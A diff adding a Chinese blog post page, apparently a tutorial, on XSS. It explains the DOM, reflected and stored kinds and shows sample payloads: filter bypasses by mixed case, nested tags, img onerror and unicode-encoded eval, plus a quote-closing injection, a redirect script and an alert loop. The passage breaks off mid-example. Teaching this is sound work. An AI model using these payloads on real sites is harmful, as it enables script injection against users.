@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><script src="/z-anshun/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=z-anshun/livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>XSS攻击和CSRF攻击 | Noodles2hg的博客</title>
+<meta name="keywords" content="web攻击">
+<meta name="description" content="XSS攻击 “XSS是跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本">
+<meta name="author" content="Noodles2hg">
+<link rel="canonical" href="http://localhost:1313/z-anshun/en/posts/blog/xss/">
+<link crossorigin="anonymous" href="/z-anshun/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css" integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z&#43;V9&#43;cO1A=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/z-anshun/img/Q.gif">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/z-anshun/img/Q.gif">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/z-anshun/img/Q.gif">
+<link rel="apple-touch-icon" href="http://localhost:1313/z-anshun/Q.gif">
+<link rel="mask-icon" href="http://localhost:1313/z-anshun/Q.gif">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="http://localhost:1313/z-anshun/en/posts/blog/xss/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="XSS攻击和CSRF攻击" />
+<meta property="og:description" content="XSS攻击 “XSS是跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/z-anshun/en/posts/blog/xss/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-10-25T12:40:21+00:00" />
+<meta property="article:modified_time" content="2020-10-25T12:40:21+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="XSS攻击和CSRF攻击"/>
+<meta name="twitter:description" content="XSS攻击 “XSS是跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "http://localhost:1313/z-anshun/en/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "XSS攻击和CSRF攻击",
+      "item": "http://localhost:1313/z-anshun/en/posts/blog/xss/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "XSS攻击和CSRF攻击",
+  "name": "XSS攻击和CSRF攻击",
+  "description": "XSS攻击 “XSS是跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本",
+  "keywords": [
+    "web攻击"
+  ],
+  "articleBody": "XSS攻击 “XSS是跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。”【摘自维基百科】\nxss 主要分为三类：\nDOM xss : DOM即文本对象模型，DOM通常代表在html、xhtml和xml中的对象，使用DOM可以允许程序和脚本动态的访问和更新文档的内容、结构和样式。它不需要服务器解析响应的直接参与，触发XSS靠的是浏览器端的DOM解析，可以认为完全是客户端的事情。 反射型 xss : 反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。 存储型 xss : 存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。 说白了就是当你游览一下页面的时候，它可能就会窃取一些你的信息\nDOM xss 我们先来看一个例子\n1 2 3 4 5 6 7 8 9 10 \u003chtml\u003e \u003chead\u003e \u003ctitle\u003e留言板\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cdiv id=”board”\u003e \u003cscript\u003ealert(\"hello world\")\u003c/script\u003e \u003c/div\u003e \u003c/body\u003e \u003c/html\u003e 这是一段很简单的HTML代码，当你访问这个页面的时候，就会有提示框弹出\n虽然这里是“hello world”，但在真正的xss攻击中，还能做很多事情\n比如：\n1.窃取网页浏览中的cookie值\n​\tjs中有这样一个代码document.cookie，相信这个大家都知道吧，就是获取cookie，但是假设这个cookie是你登录某个页面时留下来的，这个cookie就相当于你的令牌。换句话说如果像空间说说中能够写入xss攻击语句，那岂不是看了你说说的人的号 你都可以登录\n不过我们也可以设置：Http-Only（只有在http请求头中会有此cookie信息，而不能通过document.cookie来访问此cookie） 保证同一cookie不能被滥用\n2.劫持流量实现恶意跳转\n​\t试想一下，有这样一段代码\n1 \u003cscript\u003ewindow.location.href=\"http://www.baidu.com\";\u003c/script\u003e 那么所访问的网站就会被跳转到百度的首页（该代码就是当有人访问这个页面的时候，这个事件都会发送，从而实现跳转）\n据了解：在2011年新浪就曾爆出过严重的xss漏洞，导致大量用户自动关注某个微博号并自动转发某条微博\n反射型 xss 反射型xss主要运用的是利用与绕过\n大小写绕过\n个别网站可能会过滤掉script标签，但是却没想到标签中的大小写并不影响浏览器的解释\n如下：\n1 http://192.168.1.102/xss/example2.php?name=\u003csCript\u003ealert(\"hey!\")\u003c/scRipt\u003e 如果访问这个网站，就会打印出‘hey’，换句话说",
+  "wordCount" : "3435",
+  "inLanguage": "en",
+  "datePublished": "2020-10-25T12:40:21Z",
+  "dateModified": "2020-10-25T12:40:21Z",
+  "author":{
+    "@type": "Person",
+    "name": "Noodles2hg"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "http://localhost:1313/z-anshun/en/posts/blog/xss/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Noodles2hg的博客",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "http://localhost:1313/z-anshun/img/Q.gif"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/z-anshun/en/" accesskey="h" title="Noodles2hg&#39;s Blog (Alt + H)">
+                <img src="https://www.sulvblog.cn/Q.gif" alt="" aria-label="logo"
+                    height="35">Noodles2hg&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+                <ul class="lang-switch"><li>|</li>
+                </ul>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/z-anshun/en/search/" title="🔍搜索 (Alt &#43; /)" accesskey=/>
+                    <span>🔍搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/z-anshun/en/posts" title="📚文章">
+                    <span>📚文章</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/z-anshun/en/archives/" title="⏱时间轴">
+                    <span>⏱时间轴</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/z-anshun/en/tags" title="🔖标签">
+                    <span>🔖标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/z-anshun/en/about" title="🙋🏻‍♂️关于">
+                    <span>🙋🏻‍♂️关于</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/z-anshun/en/links" title="🤝友链">
+                    <span>🤝友链</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="http://localhost:1313/z-anshun/en/">Home</a>&nbsp;»&nbsp;<a href="http://localhost:1313/z-anshun/en/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      XSS攻击和CSRF攻击
+    </h1>
+    <div class="post-meta"><span title='2020-10-25 12:40:21 +0000 UTC'>2020-10-25</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;Noodles2hg
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#xss%e6%94%bb%e5%87%bb" aria-label="XSS攻击">XSS攻击</a><ul>
+                        
+                <li>
+                    <a href="#dom-xss" aria-label="DOM xss">DOM xss</a></li>
+                <li>
+                    <a href="#%e5%8f%8d%e5%b0%84%e5%9e%8b-xss" aria-label="反射型 xss">反射型 xss</a></li>
+                <li>
+                    <a href="#%e5%ad%98%e5%82%a8%e5%9e%8b-xss" aria-label="存储型 xss">存储型 xss</a></li>
+                <li>
+                    <a href="#%e5%a6%82%e4%bd%95%e9%a2%84%e9%98%b2xss" aria-label="如何预防xss？">如何预防xss？</a></li></ul>
+                </li>
+                <li>
+                    <a href="#csrf%e6%94%bb%e5%87%bb" aria-label="CSRF攻击">CSRF攻击</a></li>
+                <li>
+                    <a href="#%e6%80%bb%e7%bb%93" aria-label="总结：">总结：</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h3 id="xss攻击">XSS攻击<a hidden class="anchor" aria-hidden="true" href="#xss攻击">#</a></h3>
+<blockquote>
+<p>“XSS是跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里<strong>插入恶意<code>Script</code>代码</strong>，当用户浏览该页之时，嵌入其中Web里面的<code>Script</code>代码会被执行，从而达到恶意攻击用户的目的。”【摘自维基百科】</p>
+</blockquote>
+<p><strong>xss 主要分为三类：</strong></p>
+<ul>
+<li>DOM xss :
+DOM即文本对象模型，DOM通常代表在html、xhtml和xml中的对象，使用DOM可以允许程序和脚本动态的访问和更新文档的内容、结构和样式。它不需要服务器解析响应的直接参与，触发XSS靠的是浏览器端的DOM解析，可以认为<strong>完全是客户端的事情</strong>。</li>
+<li>反射型 xss :
+反射型XSS也被称为<strong>非持久性XSS</strong>，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，<strong>最后浏览器解析执行</strong>。</li>
+<li>存储型 xss :
+存储型XSS又被称为<strong>持久性XSS</strong>，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有<strong>更高的隐蔽性</strong>，所以危害更大，因为它<strong>不需要用户手动触发</strong>。 允许用户<strong>存储数据的web程序</strong>都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。</li>
+</ul>
+<p>说白了就是当你游览一下页面的时候，它可能就会窃取一些你的信息</p>
+<h4 id="dom-xss">DOM xss<a hidden class="anchor" aria-hidden="true" href="#dom-xss">#</a></h4>
+<p>我们先来看一个例子</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="font-weight:bold">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="font-weight:bold">head</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;<span style="font-weight:bold">title</span>&gt;留言板&lt;/<span style="font-weight:bold">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="font-weight:bold">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="font-weight:bold">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="font-weight:bold">div</span> <span style="color:#007f7f">id</span>=<span style="color:#0ff;font-weight:bold">”board”</span>&gt;
+</span></span><span style="display:flex;"><span>	&lt;<span style="font-weight:bold">script</span>&gt;alert(<span style="color:#0ff;font-weight:bold">&#34;hello world&#34;</span>)&lt;/<span style="font-weight:bold">script</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="font-weight:bold">div</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="font-weight:bold">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="font-weight:bold">html</span>&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这是一段很简单的HTML代码，当你访问这个页面的时候，就会有提示框弹出</p>
+<p><img src="https://i.loli.net/2020/10/24/cfVvdLYJCT6BxFO.png" alt="image-20201023205148449" style="zoom:80%;" />虽然这里是“hello world”，但在真正的xss攻击中，还能做很多事情</p>
+<p>比如：</p>
+<p><strong>1.窃取网页浏览中的cookie值</strong></p>
+<p>​	js中有这样一个代码<code>document.cookie</code>，相信这个大家都知道吧，就是获取cookie，但是假设这个cookie是你登录某个页面时留下来的，这个cookie就相当于你的令牌。换句话说如果像空间说说中能够写入xss攻击语句，那岂不是看了你说说的人的号 你都可以登录</p>
+<p>不过我们也可以设置：Http-Only（只有<strong>在http请求头中会有此cookie信息</strong>，而不能通过document.cookie来访问此cookie） 保证同一cookie不能被滥用</p>
+<p><strong>2.劫持流量实现恶意跳转</strong></p>
+<p>​	试想一下，有这样一段代码</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="font-weight:bold">script</span>&gt;<span style="color:#fff;font-weight:bold">window</span>.location.href=<span style="color:#0ff;font-weight:bold">&#34;http://www.baidu.com&#34;</span>;&lt;/<span style="font-weight:bold">script</span>&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>那么所访问的网站就会被跳转到百度的首页（该代码就是当有人访问这个页面的时候，这个事件都会发送，从而实现跳转）</p>
+<p>据了解：在2011年新浪就曾爆出过严重的xss漏洞，导致大量用户自动关注某个微博号并自动转发某条微博</p>
+<h4 id="反射型-xss">反射型 xss<a hidden class="anchor" aria-hidden="true" href="#反射型-xss">#</a></h4>
+<p>反射型xss主要运用的是<strong>利用与绕过</strong></p>
+<ol>
+<li>
+<p>大小写绕过</p>
+<p>个别网站可能会过滤掉script标签，但是却没想到<strong>标签中的大小写并不影响浏览器</strong>的解释</p>
+<p>如下：</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>http://192.168.1.102/xss/example2.php?name=&lt;<span style="font-weight:bold">sCript</span>&gt;alert(<span style="color:#0ff;font-weight:bold">&#34;hey!&#34;</span>)&lt;/<span style="font-weight:bold">scRipt</span>&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>如果访问这个网站，就会打印出‘hey’，换句话说<code>&lt;script&gt;</code>中的脚本被执行了</p>
+</li>
+<li>
+<p>利用过滤后的返回语句再次构成攻击语句来绕过攻击</p>
+<p>换句话说就是让过滤掉后了的语句中任有 script 标签</p>
+<p>如：</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>http://192.168.1.102/xss/example3.php?name=&lt;<span style="font-weight:bold">sCri</span><span style="color:#f00">&lt;</span><span style="color:#007f7f">script</span>&gt;pt&gt;alert(&#34;hey!&#34;)<span style="color:#f00">&lt;</span>/scRi&lt;/<span style="font-weight:bold">script</span>&gt;pt&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这个了只过滤掉了 &lt;sCri 和 &lt;/scRi，但仍还有 script 标签，也就是仍然可以执行脚本</p>
+</li>
+<li>
+<p>插入其它标签的代码</p>
+<p>首先，并不是只有script标签的插入能够植入脚本的</p>
+<p>比如</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>http://192.168.1.102/xss/example4.php?name=&lt;<span style="font-weight:bold">img</span> <span style="color:#007f7f">src</span>=<span style="color:#0ff;font-weight:bold">&#39;w.123&#39;</span> <span style="color:#007f7f">onerror</span>=<span style="color:#0ff;font-weight:bold">&#39;alert(&#34;hey!&#34;)&#39;</span>&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里虽然插入的img标签，但该标签中的onerror事件任然执行了，也到达到了其目的</p>
+<p>再比如</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="font-weight:bold">a</span> <span style="color:#007f7f">onmousemove</span>=<span style="color:#0ff;font-weight:bold">’do</span> <span style="color:#007f7f">something</span> <span style="color:#007f7f">here</span><span style="color:#f00">’</span>&gt; 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里的onmousemove也能触发事件，其它还有onclick（点击事件发生）、onmouseenter（鼠标指针移动到元素上时触发事件）这类的，这些就涉及到一些前端的了，我在这里就不赘述</p>
+</li>
+<li>
+<p>编码要植入的脚本代码绕过关键字的过滤</p>
+<p>js中有个<code>eval()</code>方法，会将编码过的语句解码后再执行，从而便能绕过关键字过滤，如：</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>http://192.168.1.102/xss/example5.php?name=&lt;<span style="font-weight:bold">script</span>&gt;<span style="color:#fff;font-weight:bold">eval</span>(\u0061\u006c\u0065\u0072\u0074(<span style="color:#ff0;font-weight:bold">1</span>))&lt;/<span style="font-weight:bold">script</span>&gt;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里的<code>\u0061\u006c\u0065\u0072\u0074(1)</code>，是<code>alert(1)</code>编码后的</p>
+</li>
+<li>
+<p>主动闭合标签实现注入</p>
+<p>我们先来看一份代码截图</p>
+<p><img loading="lazy" src="https://i.loli.net/2020/10/24/mVEUejL3prn9fgz.png" alt="image-20201024221343374"  />
+</p>
+<p>这里，直接在js中拿取变量，但是，js不像go语言那种强类型语言，js是弱类型的，也就是对变量并没有明确的定义，所以当我们输入：</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>http://192.168.1.102/xss/example6.php?name=&#34;;alert(&#34;I am a
+</span></span><span style="display:flex;"><span>hacker~&#34;);&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>其代码就变成了这样，完成了脚本的植入</p>
+<p><img loading="lazy" src="https://i.loli.net/2020/10/24/3tLAfCojGUXKS1x.png" alt="image-20201024221709710"  />
+</p>
+</li>
+</ol>
+<h4 id="存储型-xss">存储型 xss<a hidden class="anchor" aria-hidden="true" href="#存储型-xss">#</a></h4>
+<p>储存，就如字面上的意思，讲恶意代码储存在数据库里，通常是在留言板使用（可以设想一下，当一个人读留言板时，服务器肯定会向用户展示留言板的内容，但如果留言板储存的恶意脚本，不就执行了？就跟上面新浪微博的那个事件一样），这个跟反射型 xss不同的是，只需要用户访问这个页面就行了</p>
+<p>这个跟DOM类型的 xss很相似</p>
+<p>比如你在一个留言板上这么写</p>
+<div class="highlight"><div style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span> &lt;<span style="font-weight:bold">script</span>&gt;
+</span></span><span style="display:flex;"><span>      <span style="color:#fff;font-weight:bold">while</span> (<span style="color:#fff;font-weight:bold">true</span>) {
+</span></span><span style="display:flex;"><span>          alert(<span style="color:#0ff;font-weight:bold">&#39;Hello&#39;</span>)
+</span></span><span style="display:flex;"><span>      }
